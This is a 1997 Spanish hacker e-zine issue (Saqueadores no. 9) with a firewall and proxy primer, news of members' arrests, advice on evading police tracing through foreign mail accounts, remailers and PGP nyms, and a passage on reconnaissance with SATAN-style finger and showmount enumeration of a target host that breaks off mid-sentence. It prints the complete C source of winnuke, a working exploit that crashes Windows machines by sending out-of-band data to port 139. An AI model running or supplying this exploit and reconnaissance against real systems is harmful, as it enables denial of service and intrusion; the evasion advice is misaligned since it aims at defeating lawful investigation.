ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ                SAQUEADORES EDICION TECNICA Nง9  15-6-97                   บ
บ                             Segunda Epoca                                 บ
วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
บ                   Fanzine del underground informatico                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

ษอออออออออออออออออหอออออออออออออออออออออออออออออออออออออออออออออออออออออออออป 
บ  Disponible en  บ  http://www.geocities.com/SiliconValley/8726            บ
บ                 บ  http://www.geocities.com/SiliconValley/Park/7479/      บ
บ                 บ  Y en las mejores BBS                                   บ
บ                 บ  Editor provisional: Paseante <paseante@geocities.com>  บ
ศอออออออออออออออออสอออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ Todos los contenidos de esta revista son solamente educativos, ninguno    บ
บ pretende incitar al crimen o a la ilegalidad. Cualquier uso erroneo de    บ
บ esta informacion no es responsabilidad nuestra. Asi mismo, no nos hacemos บ                                                             
บ responsables de las informaciones u opiniones de nuestros colaboradores   บ                                                             
บ o informadores.                                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Welcome to the system...


ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 01. CONTENIDOS                                                            บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Nง__Titulo/Autor___________________________________Tema_________Nivel tecnico_

01. Contenidos                                     Saqueadores nง 9
02. Noticias -importante-                          Saqueadores nง 9
03. Firewalls y Proxys I / por Paseante            Netsecurity    Medio-alto
04. OOB Attack! / por Paseante                     Crashin'       Medio
05. Correo Anonimo / por Paseante                  Anonimato      Medio-bajo
06. A solas con SATAN / por Paseante               Hackin         Medio-alto
07. _Los_ bugs del mes / por Paseante              Hackin         Diverso
08. Colaboraciones y Peticiones                    Saqueadores nง 9
09. Glosario del cursillo de firewalls             Vocabulario
10. Despedida                                      Saqueadores nง 9



ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 02. NOTICIAS- IMPORTANTE                                                  บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

Muchos de vosotros ya sabreis la "razzia" efectuada por la G.Civil que ha
acabado con el desmantelamiento de Isla Tortuga/Vesatec y con las detenciones
de varios miembros del grupo Saqueadores entre ellos su editor el Duke.
No obstante este brutal ataque contra quienes como nosotros difundimos
informaciขn y no drogas ni armas ni pornografia infantil la revista NO VA a
dejar de publicarse, este numero es algo especial pues esta hecho por una
sola persona, Paseante, ya que los que no han sido detenidos estan en estos
momentos con las lineas de comunicacion cortadas, espero que para siguientes
numeros podamos contar con ellos y tambien con VOSOTROS.

Ahora mismo necesitamos mas que nunca vuestra ayuda y colaboracion en forma
de articulos, apoyo y difusion de la revista y del hecho de que pese a todo
PERMANECE.

Desde aqui pedimos libertad ya para el Duke, los miembros de Saqueadores y
de Iberhack detenidos en una "redada" absurda. Nosotros a titulo particular
venimos expresando nuestra solidaridad con los familiares de los secuestrados
por ETA desde hace tiempo. Hoy mas que nunca TODOS LIBRES.

Tengo que confesar que cuando en uno de sus mensajes el Duke me comento que
sentia que "algo iba mal" no me lo tome a cachondeo pero no le supe dar la
importancia debida, en los ultimos tiempos habia extremado las precauciones
no contestando mas correo que el imprescindible para evitar causar problemas
a gente que no tenia nada que ver con el grupo. Fue una actitud muy
inteligente de su parte aunque a algunos os pueda haber dado la impresion
de que el grupo "no sabe, no contesta" por nuestro mutismo durante esa epoca
lo cierto es que se trataba de reducir riesgos al minimo por el mal
ambiente que comenzaba a respirarse.


Nada mas, he montado un site apresurado en Geocities
(http://www.geocities.com/SiliconValley/8726) que sera la homepage de la
revista hasta que pase la tormenta o definitivamente ya se vera.
Alli podreis encontrar todos los numeros pasados y los que vayan saliendo
asi como noticias puntuales (pero no os penseis que se hacen actualizaciones
a diario)

  



ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 02. FIREWALLS Y PROXYS                                                    บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ



Introduccion

Esta es la primera parte de un 'cursillo' sobre proxys y firewalls que
esta previsto tenga 3 capitulos, veremos este mes una introduccion, en la
siguiente revista daremos una ojeada a las tecnicas de proteccion mas
comunes y en la ultima entrega.....las tecnicas de ataque mas comunes.
Es un poco arido para novatos _advierto_, por lo que voy a incluir un
breve glosario de terminos para aquellos que pese a todo quieran leerlo y
se "pierdan". 


Las redes de ordenadores tienen por naturaleza el cometido de permitir el
libre flujo de informacion, hacer posible que un usuario de Madrid tenga un
proceso en marcha en una computadora de Paris y al tiempo consulte la base de
datos de la central en Londres todo como si los tres ordenadores estuvieran
en la misma habitacion, detener o impedir este flujo de informacion es
perjudicial tanto para las compaคias como para los gobiernos pero proteger
sus datos de intrusiones no autorizadas es vital, se crea asi el
dilema de como establecer un sistema de seguridad que tenga el minimo impacto
posible en la "utilidad" de la red.

El proposito de los firewalls de Internet es pues proporcionar un punto de
defensa que controle y vigile los accesos a los servicios que proporciona una
red privada tanto desde dentro como desde fuera de esa red. Esto requiere un
mecanismo que de manera selectiva autorice o bloquee el trafico entre
Internet y la red protegida, basicamente hay dos sistemas: Routers y
Screening.

Los routers pueden controlar el trafico basandose en la direccion IP o el
puerto utilizado de manera que ciertas direcciones IP tengan acceso y a otras
les sea negado.
Los host que efectฃan screening pueden controlar el trafico a nivel de
aplicacion, 'sacando' al usuario del nivel de protocolo y examinando mas
detenidamente el acceso,.

Para implementar un firewall que se base en 'routing and screening' se
necesita al menos autorizar el acceso directo a la red protegida desde un
n๘ x de direcciones IP, a nivel de screening esto no seria necesario pero son
menos flexibles y requieren el desarrollo de unos 'forwarders' conocidos como
proxys, el escoger un sistema u otro es optar por una mayor grado de servicio
al usuario o un mayor grado de aislamiento de la red.

Para un protocolo de red un proxy es una aplicacion que se ejecuta en un host
firewall y ejecuta servicios requeridos a traves del firewall actuando como
un 'gateway'.
Los proxies dan la ilusion de una conexion directa punto a punto que en
realidad no existe y dependiendo de su capacidad pueden interpretar el
protocolo que manejan y dar mayor grado de control y vigilancia al
administrador.

Por ejemplo:
Un proxy de FTP puede bloquear la exportacion de ficheros de un sistema y
permitir por contra que se 'suban' (upload) ficheros mientras que los
firewalls basados en routing no pueden hacer esto.
 
Existen proxies para servicios como FTP, Telnet, etc... Posiblemente el mayor
beneficio a la seguridad que da el utilizar un proxy es que da la oportunidad
de autentificar al usuario.

Por ejemplo: Cuando te conectas desde Internet a una red protegida, lo mas
tipico es conectarse primero al proxy, autentificarse ante el y tras ello se
completa la conexion con el host que ya pertenece a la red protegida, asi el
proxy protege al mismo firewall, el usuario ya no accede ni siquiera al
firewall para identificarse y ello protege a la red ya que solo los
autenticos usuarios obtienen acceso al interior de la red.
Por lo tanto aunque dentro de la red existan "agujeros de seguridad" el
restringir el acceso a usuarios autorizados es una primera medida de
precaucion.

Otros servicios como SMTP y USENET usan unos 'daemons' que en ocasiones
poseen privilegios de sistema, si estos daemons contienen bugs, un atacante
pueden explotarlos en su beneficio.
Para evitar este peligro los proxys se diseคan para ejecutarse sin
privilegios de sistema especiales, idealmente un usuario exterior ni siquiera
tendria la oportunidad de interactuar con un proceso privilegiado, en la
practica el daemon master de Internet (inetd) que es el encargado de iniciar
a los otros daemons necesita ejecutarse con privilegios, siempre existe la
posibilidad de que el kernel contenga backdoors, servicios escondidos o bugs
que permitan a un atacante acceder al sistema. Esta es posiblemente la mejor
manera de atacar un proxy.


Filosofia de Diseคo

O sea, la manera en la que debe diseคarse un proxy para ser seguro.
(Recomendaciones oficiales aqui resumidas pertenecientes a un trabajo
realizado para la agencia ARP del Departamento de Defensa de los Estados
Unidos)

- Cualquier bug que pueda haber en la implementacion de un servicio de red no
debe ser capaz de comprometer el sistema. Los servicios mal configurados no
se ejecutaran antes que ofrecer potenciales brechas de seguridad.

*_Importante_*
- Los accesos desde el exterior de la red protegida no podran conectar
directamente con el interior ni con servicios que posean privilegios.


-  Los servicios de red son implementados con un minimo de caracteristicas y
complejidad, el codigo fuente debe ser lo suficientemente pequeคo y simple
como para ser revisado con celeridad.

- Deben existir metodos razonables y practicos de 'testear' si el sistema
esta correctamente instalado.

Aclaraciones de Paseante
---------------------------------------------------------
En un host-based firewall cuando se se hackea el host la red entera esta
abierta al ataque, no obstante esta solucion es facil de instalar, mantener,
configurar y monitorizar (segฃn ellos)
----------------------------------------------------------

Y ahora un ejemplito de las reglas de configuracion de un proxy que se que lo
estabais deseando, (tened siempre en cuenta que se busca el equilibrio entre
seguridad y posibilidad de uso)

  # Ejemplo ftp gateway rules:

  # --------------------------

  ftp-gw: authserver 127.0.0.1 7777   // Se establece el servidor que
                                         se usa como "autentificador"

  ftp-gw: denial-msg /usr/local/etc/ftp-deny.txt    // Mensaje de error al
                                                      canto

  ftp-gw: welcome-msg /usr/local/etc/ftp-welcome.txt  // Bienvenido user
                                                         legitimo

  ftp-gw: help-msg /usr/local/etc/ftp-help.txt

  ftp-gw: timeout 3600

  ftp-gw: permit-hosts 192.33.112.100  // Comienza el baile de permisos
                                          y restricciones

  ftp-gw: deny-hosts 128.52.46.*

  ftp-gw: permit-hosts 192.33.112.* -log { retr stor } -auth { stor }

  ftp-gw: permit-hosts * -authall


A continuacion veremos como una red protegida utiliza proxys para prestar una
serie de servicios con el minimo riesgo de verse comprometida.

Logging
E-mail
DNS
FTP
Telnet
Control de acceso TCP

Vamos pues a examinar las caracteristicas que debe tener un proxy que sirva
como gateway en esas areas para proporcionar servicios sin comprometer a la
red.

     Logging 

Todo aquello de importancia y los registros de acceso son guardados en un
host protegido de la red interna via syslog, el administrador puede ejecutar
programas que "escaneen" el registro en busca de sucesos definidos y en caso
de encontrarlos hacer saltar una alarma.
Los tiempos de enviar claves "en claro" a traves de Inet quedan atras por
temor a los sniffers, se recomienda las claves de un "solo uso"
(CRYPTOCard..etc) basicamente el firewall nos hace una pregunta y un
programita de nuestro ordenador la contesta, la pregunta es cada vez diferente
y la respuesta se basa en una relacion matematica asi que aunque alguien se
entere da igual porque la proxima vez pregunta y respuesta seran
distintas.

     E-Mail

Uno de los puntos de ataque favoritos (recordad el "gusano" de Morris), se
han identificado muchos bugs del sendmail que han sido yendo corregidos en
las nuevas versiones
El problema de los mailers es complicado puesto que son complejos y necesitan
privilegios para ejecutar acciones en beneficio del usuario (manipular
mailboxes, ficheros..) Para proveer un sistema de correo seguro el acceso
desde la red a sendmail de manera directa se evita y en su lugar se presenta
una miniversion del SMTP un proxy llamado smap lo suficientemente pequeคo
para que su codigo no tenga ninguna "sorpresa" y lo ฃnico que hace es aceptar
los mensajes y escribirlos en disco en un area especifica, tras ello otro
proceso  recoge el correo  y lo entrega al autentico sendmail para que lo
deposite en los buzones correspondientes (lo que sendmail puede hacer sin que
se le otorguen privilegios)

Aclaraciones de Paseante
-------------------------------------------------
Aฃn hoy muchos firewalls de Internet ejecutan directamente sendmail
porque confian en la "fiabilidad" de su version lo que no es la mejor opcion
desde el punto de vista de la seguridad.

Evidentemente puestos a buscar bugs es mucho mas facil detectarlos en las 700
lineas de codigo de smap que en las 20.000 de sendmail, smap ofrece ademas la
proteccion adicional de  solo ejecutar comandos como HELO, FROM, RCPT, DATA,
y QUIT dando error en otros como VRFY y EXPN para evitar intrusiones.
Smap no es la panacea, a medida que se desarrollan nuevos ataques los
administradores tienen que procurarse nuevos medios de defensa pero cada vez
lo ponen mas dificil y se hace mas complicado entrar 'a pelo' desde fuera.
--------------------------------------------------


 

      Domain Name Service (DNS)

El software de DNS disponible para UNIX no puede ser utilizado para obtener
acceso al sistema aunque algunos ataques se han basado en el spoofing de DNS
para engaคar al firewall, para eliminar esta amenaza el DNS ya no se considera
como algo valido para acceder a informacion protegida y solo el servicio de
correo "confia" en el. En los registros junto al DNS se guarda la direccion
IP, cualquier direccion IP que no coincida con el DNS es automaticamente
marcada como un intento de spoofing.

Aclaraciones de Paseante
--------------------------------------------------------
Evidentemente esto no significa que todos los sistemas se hayan adaptado ya
a esto, os recuerdo que es solo la recomendacion oficial de lo que deberian
hacer.
---------------------------------------------------------

     FTP

La aplicacion de FTP es un proceso que media entre las dos conexiones FTP,
no utiliza acceso a disco excepto para leer su configuracion y es un programa
lo suficientemente pequeคo y sencillo como para no ser una amenaza a la
seguridad (y mas teniendo en cuenta que se ejecuta sin privilegios). Para
controlar el acceso a FTP la aplicacion lee en su fichero de configuracion
los comandos que al ejecutarse activan el log y los sistemas a los que se
permite el acceso a FTP, si el administrador lo desea todo el trafico se
puede registrar y presentarse resumido.
   
     TELNET

La aplicacion TELNET es tambien (y siguiendo la filosofia de diseคo) pequeคa
y simple y su mision es intermediar entre el trafico TELNET, al igual que el
gateway de FTP el ฃnico fichero que lee es el de su configuracion y tras ello
es "chrooted" a un directorio restringido y como un proceso no privilegiado
(esto es caracteristico de todas las aplicaciones proxy actuando como
gateways.)
El fichero de configuracion de TELNET determina que sistemas o redes
exteriores pueden conectarse a nuestra red y a que sistemas o redes
exteriores puede permitirse que se conecte quien esta dentro de nuestra red.
Opcionalmente se puede requerir identificacion.
Todas las conexiones y su duracion son registradas.



     
    Servicios basados en UDP

Como hemos visto una caracteristica de los proxys es que NO SE PERMITE EL
TRAFICO DIRECTO entre un sistema exterior y uno interior, pero el UDP es una
conexion que no funciona a traves de proxys al ser punto a punto. Por lo
tanto NO SE PERMITEN servicios UDP, algunos de estos servicios como NTP y
DNS pueden no obstante prestarse a traves de un firewall si se configura el
servidor como un "forwarder" de las peticiones originadas dentro de la red
protegida.

   
     Uso y Acceso TCP

En el UNIX basado en BSD muchos procesos de red se inician con una conexion
al daemon master inetd que es quien desvia la peticion al programa que debe
resolverla.

Por ejemplo:
Recibimos una peticion de TELNET, el inetd "oye" esta peticion y busca en su
fichero de configuracion la entrada [TELNET] de acuerdo con ello ejecuta el
programa especificado en esa entrada y se le "pasa" la peticion original.

Inetd, el daemon de servicios de Internet no ejecuta otro funcion salvo la de
llamar a procesos especificos para que manejen las peticiones que se les
hacen.


     TCP Plug-Boards

Algunos servicios como Usenet news se ofrecen comฃnmente a traves de un
firewall. En ese caso el administrador tiene la posibilidad de elegir si desea
proporcionar el servicio en el mismo firewall o instalar un servidor proxy.
Ejecutar las news en el firewall puede exponer la maquina a posible bugs en
el soft de news por lo que es mas seguro utilizar un proxy como gateway  a un
sistema seguro para ello existen los "plugs-boards" que si bien en muchos
casos han sido diseคados para el servicio Usenet news pueden emplearse como
proxys de proposito general si se desea ya que actuan como "una tuberia de
datos" sin utilizar el disco local o llamar a otros procesos o subshells y
por supuesto como todos los proxys pueden hacer un log de todas las
conexiones.

Aclaraciones de Paseante
----------------------------------------------------------------
Como nada es perfecto los plugs-boards no usan autentificacion del usuario
(salvo la direccion del host y del cliente) y no examinan el trafico que pasa
a traves de ellos.
Si un servidor (por ejemplo el servidor de NNTP) tiene una brecha de
seguridad podria ser explotada, el firewall haria a un atacante mucho mas
dificil obtener acceso a la red para seguir explotando ese fallo pero si el
servidor NNTP hubiese estado ejecutandose en el mismo firewall entonces todo
el firewall se habria vuelto vulnerable.
-----------------------------------------------------------------



En la practica que los servidores no tengan privilegios de sistema especiales
incrementa de manera notable la seguridad del firewall, mas aฃn la metodologia
de desconectar todos los servicios al minimo y despues monitorizarlos uno a
uno, caso a caso hace mayor la confianza de estar construyendo un sistema
dificil de 'romper'. La decision de confiar mas en un sistema basado en
"routers" o en "screenings" sigue siendo dificil y depende de muchos factores.
Los firewall son necesarios porque muchos servicios fueron desarrollados con
un nivel de seguridad muy bajo o sin ninguno en absoluto, los administradores
de redes han aprendido rapidamente la necesidad de contar con severas medidas
de identificacion y con protocolos bien diseคados.
Como siempre la ventaja tecnologica esta de parte del administrador, de su
pereza e incompetencia depende que alguien vulnere la seguridad de su red.





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 03. OOB ATTACK!                                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Recientemente, principios de mayo 97, se empezo a comentar en algunos circulos
que un fallo en el manejo de datos OOB (Out of Band-Fuera de Banda) por parte
de Windows en sus versiones Win 3.11, Win 95 y Win NT podia hacer que un
atacante _desconectase y colgase_ el ordenador de una persona que estuviese
conectada a Internet usando uno de esos S.O (o seudo operativos).
Los requisitos eran que la presa utilizase el protocolo NetBios, el estandar
de IBM para redes, y no estuviese tras un proxy o firewall, si se cumplian
esos requisitos bastaba con saber su direccion IP para mandarle unos datos
modulados como OOB al puerto 139 y hacer que le apareciese la tipica pantalla
azul de Windows con el mensaje: "El sistema se halla ocupado o bien se ha
vuelto inestable...".

Unica solucion?. Resetear el ordenador, incluso usando NT, perder la conexion
y datos no guardados.

Respuesta de MSoft?. Incluida en el Service Pack 3 para NT, avanzando para
Windows 95, (para cuando salga la revista ya habra parche) y desentendimiento
de Win 3.11.

Problema?. Que aun en el caso de aplicar el patch _si el atacante utilizaba
un Macintosh *colgaba* el ordenador victima_ (que risa para los fanaticos del
Mac). Se hablo de "diferente implementacion del TCP/IP" en el Apple pero
parece que al final se trataba de que el Mac enviaba los datos con el flag
de urgente. De todos modos MS saco un nuevo parche que esta vez si fija el
problema (como estan acostumbrados a sacar patchs se dan mucha maคa ;> )

Como las noticias vuelan es posible que muchos de vosotros hayais sido
victimas o verdugos, quien sabe? de este "bug" vamos a incluir aqui el
programa original que destapo el asunto obra de _eci.
Aqui va el codigo original en C

/* winnuke.c - (05/07/97)  By _eci  */
/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define dport 139  /* Ataque al puerto 139: solo por diversion */

int x, s;
char *str = "Bye now, have sweet dreams!";  /* Cadena a enviar como OOB */
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;                  /* Busca la presa */
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);


    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");       /* Presa en punto de mira */
             close(sock);
             return(-4);
        }
        printf("Conectado a [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {

     if (argc != 2) {
       printf("Usage: %s <target>\n",argv[0]);
       exit(0);
     }

     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }

     open_sock(s,argv[1],dport);


     printf("Running crash... ");       /*Modula la cadena como OOB */
       send(s,str,strlen(str),MSG_OOB);
       usleep(100000);
     printf("Done!\n");
     close(s);
}

Por supuesto espero que nadie se dedique a colgar ordenadores a diestro y
siniestro, no seais lamers.




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 05. CORREO ANONIMO                                                        บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Deberia ser algo basico que cualquier persona que aspire a algo mas que hacer
compras on-line o visitar el Web de La Moncloa (por cierto penosillo)
supiese como enviar correo anonimo y sin embargo casi todas las detenciones
y "operaciones" policiales se han basado en lo mismo.

- Lectura de mensajes 'sospechosos' de un usuario que no oculta su e-mail.
- Peticion al juez de orden para "pincharle" su cuenta de correo
- Aviso a su ISP (Proveedor de Servicio Internet) para montar la vigilancia
  y poder leer los mensajes que lleguen a dicho usuario.
- Recopilacion de "datos y pruebas" que luego permitan dar el golpe.

Incluso gente que se dedica a vender warez ญญSE ANUNCIA CON SU PROPIA
DIRECCION!! y la gente que lo compra igual, estoy seguro de que a veces en
las news ponen hasta su tlf. y DNI. Los Gciviles puede que no sepan hacer
grandes cosas pero os aseguro que leer lo sabe hacer casi todo el que esta
metido en esto de Internet y por supuesto suscribirse a esp.comp.hackers
tambien... por eso no lo hace nadie que valga la pena.
Con semejantes facilidades no es extraคo que la Guardia Civil se este
hinchando a detener piratas y A LOS QUE NO LO SON (caso del Duke pillado
en una operacion mucho mas daคina y malintencionada).

Pensad. Utilizad la cabecita.

- Internet abarca todo el mundo, la justicia espaคola solo abarca territorio
espaคol a menos que recurra a largos y pesados tramites.

จPORQUE NO ABRIS CUENTAS EN PROVEEDORES EXTRANJEROS?, un mandamiento de un
juez espaคol no autoriza a pinchar una cuenta POP residente en Australia o
Noruega y las dan _GRATIS_. Haced que gasten tiempo y dinero enviando
comisiones rogatorias que les seran denegadas. จPara que sirve Hotmail y
tantos otros?. HotMail incluso es accesible POP, ya se que muchos no lo
saben pero esa es una de las cosas que distingue a un hacker del que no lo
es.

Servidores Hotmail: mail.hotmail.com // pop.hotmail.com // hotmail.com
Dependiendo de vuestro login name os funcionara uno u otro y podreis coger
y enviar correo de HotMail con el Eudora, Pegasus, etc.. supongo que tarde
o temprano "cerraran la brecha" para que la gente no se salte la publicidad.
Mientras tanto, a mi salud.


จHABEIS OIDO HABLAR DE LA ENCRIPTACION?
Incluso aunque os pinchen la cuenta no sirve de nada si no pueden _leerlo_
utilizad el PGP, tambien es GRATIS. Dadles con un palmo de narices y no
sigais yendo con el lirio en la mano. Los tiempos han cambiado y para peor.
Supongo que se nota que estoy cabreado pero..tanta gente detenida o
simplemente "interrogada", tanta confianza idiota y era tan facil llegar
hasta algunos de ellos... en fin.

Lo primero es saber que es el correo anonimo, cada vez que enviamos un
mensaje queda registrado nuestra IP en ese momento como originadores del
mensaje, si usamos programas como Eudora tambien nuestra cuenta POP real se
envia como uno de los X-headers del mensaje, en cualquier caso es obvio que
el rastro es intolerablemente claro.
Frente a ello un remailer actua como "intermediario", nosotros enviamos
nuestro correo al remailer y este lo "re-envia" a su destino final borrando
toda la informacion sobre nosotros y figurando como su origen.
No os confieis de todas maneras, si lo usais para actos claramente delictivos
ellos daran vuestros datos a la policia si esta los solicita, lo dejan bien
claro, no se van a jugar el culo por vosotros.

En la 2ฆ Guerra Mundial algunos judios que querian enviar noticias utilizaban
un truco consistente en escribir a alguien "fuera de sospecha", la carta
contenia un sobre cerrado con la direccion ya escrita, el destinatario cogia
este sobre y simplemente le ponia un sello y lo echaba al buzon, la carta
llegaba ahora a otra persona a la cual el primero no podria haber escrito
sin despertar las sospechas de la censura. Un remailer funciona mas o
menos de esa manera.

Podeis utilizar un remailer via Web, lastimosamente el abuso de muchos
descerebrados ha hecho que la mayor parte de los gratuitos hayan cerrado,
otra opcion es conectar al puerto SMTP (25) de un ordenador cuyo programa
de correo no guarde la IP del visitante, buscadlos hay listas.

Pero ya se lo que quereis vosotros, quereis un programa a ser posible en
entorno grafico (Windows por ejemplo) con ayuda, encriptacion PGP desde
dentro del programa (para no romperse la cabeza)..etc. Y quereis tened
automaticamente la lista de remailers en funcionamiento e irla actualizando.
Quereis mucho vosotros pero es posible...

El programa se llama Private Idaho y su ultima version es de Enero del 97 y
digo ultima por que el autor lo deja pero este magnifico programa incorpora.

- Lista de remailers por tipos: Cyberpunk, Advanced Cyberpunk, Eric, Mixmaster
- Encriptacion PGP y creacion de llaves desde el programa, aunque no tiene
  la potencia de un shell
- Posteo anonimo a Usenet
- Creacion de nyms o cuentas anonimas
- Transferencia a otras aplicaciones
- Informacion actualizable con solo seleccionar una opcion.
- Es _GRATIS_
- Y mas..

Direccion: http://www.eskimo.com/~joelm
Direccion listado de remailers y estadisticas de funcionamiento asi como
ayuda sobre su uso.
http://www.cs.berkeley.edu/~raph/remailer-list.html

Una cuenta como HotMail, Geocities.. os puede servir para recibir correo
puesto que sus servidores estan fuera del territorio espaคol muy gorda la
tendreis que hacer para que vayan a pedir autorizacion a los USA y muchas
pruebas tendran que presentar para que se la den.
Pero NO os sirve para enviar porque cuando se examina el mensaje con la
opcion "Full Headers" se vera algo como.

Received from 191.179.227.4 by web4.com - esta sera la primera linea de
la cadena de Received from ... by.. que permiten trazar la ruta de un mensaje
y la primera direccion IP es la vuestra en el momento de enviar el mensaje.
Por lo tanto ya os tienen delimitados en proveedor, universidad..etc
A partir de aqui es solo una cuestion de tiempo ser cazados y creo que ya
han detenido a _MUCHA GENTE_ para que dejeis de tomaroslo a broma.

Enviar un mensaje a traves de un remailer por contra no nos posibilita el
recibir datos puesto que para eso deberemos dar una direccion ya que el
remailer, recordadlo, ha borrado toda la informacion que permitia trazar
el mensaje de vuelta hasta nosotros. Podemos pues incluir en nuestro mensaje
una referencia a una direccion segura en la que recibir correo,
preferiblemente encriptado o bien dar de alta una cuenta anonima.

-- Los nyms--

Un nym (ano_nym_ous) es una cuenta anonima que nos permite enviar correo de
manera discreta y recibirlo a esa cuenta que luego deriva hacia nuestra
cuenta real, todo el correo tanto de ida como de vuelta viaja _encriptado_
con PGP por lo cual ha de tenerse las llaves de los remailers (Private Idaho
las coge de manera semi-automatica) y una llave propia asociada al nym.

Hasta hace poco mi nym era <pas@nym.alias.net> ahora este servidor esta
fuera de onda con lo cual la mayor parte de los mensajes se pierden pero
hasta entonces me permitio recibir y enviar correo anonima y comodamente y
sobre todo de forma segura.
Por tanto ahora me he dado de alta otras cuentas nyms y es que aunque abusar
es malo hay que acostumbrarse a tener 8 o 10 cuentas de correo en diferentes
sitios, de redireccionamiento, Web-mail, POP, nyms. Las estan dando _GRATIS_
a patadas!. Aprovechaos, nunca viene mal tener buzones "por si acaso" y lo
mismo digo de las paginas Web.
Claro que puede que prefirais que os cojan....

Esta son las direcciones de correo de algunos remailers, tened en cuenta que
solo aceptan mensajes encriptados con PGP para lo cual teneis que haceros
con su llave (probad finger) o enviar un mail con el Body remailer-help.
Recordad que Private Idaho las trae consigo y las actualiza a peticion
nuestra y que en la pagina que os he dicho obtendreis mas informacion.

remail@miron.vip.best.com
remailer@replay.com
mixmaster@remail.obscura.com
remailer@remailer.nl.com
ncognito@rigel.cyberpass.net
mix@squirrel.owl.de


Los remailers de tipo mixmaster necesitan que sus usuarios instalen un
soft especial.

La pagina del PGP (version internacional)
http://www.ifi.uio.no/~staalesc/pgp





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 06. A SOLAS CON SATAN                                                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


SATAN (Security Analysis Tool for Auditing Networks.)  Escrito por
Dan Farmer y Wietse Venema.

จQue es SATAN?. Es una herramienta pensada para que los administradores
encuentren los posibles "agujeros" de su red y los reparen, como todas las
cosas es un arma de doble filo.

SATAN fue escrito para analizar un host o grupo de hosts y recolectar via
NIS, finger, NFS, ftp, tftp, rexd y otros servicios, informacion sobre la
configuracion de una red y posibles brechas de seguridad, testeando setups
incorrectos y bugs conocidos, esta escrito de manera modular en perl, C,
shell, etc..

Es demasiado complejo para explicarlo en un solo articulo por lo que si
notamos un feedback positivo lo ampliaremos en posteriores ediciones.
En este numero nos limitaremos a explicar como "ganar informacion" sobre
nuestro objetivo.

Vamos a tratar de obtener informacion digamos sobre victima.com, para ello
podemos recurrir a servicios como finger, showmount, rcpinfo, DNS, whois,
sendmail, ftp..etc. En este ejemplo actuaremos desde saq.com

victima % finger victima.com

[victima.com]
Login       Name             TTY Idle     When    Where
palo      Dr. Lucas           co   1d  Wed 08:00  paf.com

Bien, solo un usuario desde luego si entras no habra mucha gente que se
pueda  dar cuenta.
Ahora vamos a probar a hacer finger a cuentas como  "@", "0" y "" y a nombres
comunes como root, bin, ftp, system, guest, demo, manager, etc., para ver que
info obtenemos. La informacion obtenida sera generalmente nombres de cuentas,
home directories y su ultimo log.
NOTA: En _muchos_ casos los proveedores estan deshabilitando el servicio
finger por los peligros de seguridad que conlleva.

A la informacion asi obtenida se le puede aคadir la conseguida al ejecutar
rusers -l que proporciona datos sobre los usuarios actuales de la red.

Veamos un ejemplo de lo que podria ser un output de esos comandos una vez
la informacion esta ordenada.

                       Victima.com

Login   Home-dir    Shell      Ultimo login: Desde.
 -----   --------    -----      ----------------------
root    /           /bin/sh    Fri Nov 5 07:42 on ttyp1 from big.victim.com
bin     /bin                   Never logged in
nobody  /                      Tue Jun 15 08:57 on ttyp2 from srv.victima.com
daemon  /                      Tue Mar 23 12:14 on ttyp0 from big.victima.com
sync    /           /bin/sync  Tue Mar 23 12:14 on ttyp0 from big.victima.com
zen     /home/zen   /bin/bash  On since Wed Nov  6 on ttyp3 from xxx.com
pas     /home/pas   /bin/csh   Wed Nov  5 05:33 on ttyp3 from saq.com
guest   /export/foo /bin/sh    Never logged in
ftp     /home/ftp              Never logged in

Esta informacion no permite entrar en el sistema evidentemente pero ya sabemos
unas cuantas cosas sobre victima.com sin habernos tomado mucho trabajo, por
eso estan deshabilitando el finger a marchas forzadas. :(

Vamos a seguir recogiendo info, ejecutemos showmount en victima.com

 Saq.com % showmount -e victima.com
 export list for victima.com:
 /export                            (everyone)
 /var                               (everyone)
 /usr                               easy
 /export/exec/kvm/sun4c.sunos.4.1.3 easy
 /export/root/easy                  easy
 /export/swap/easy                  easy

Vemos que /export es accesible para todo el mundo y click! nos acordamos
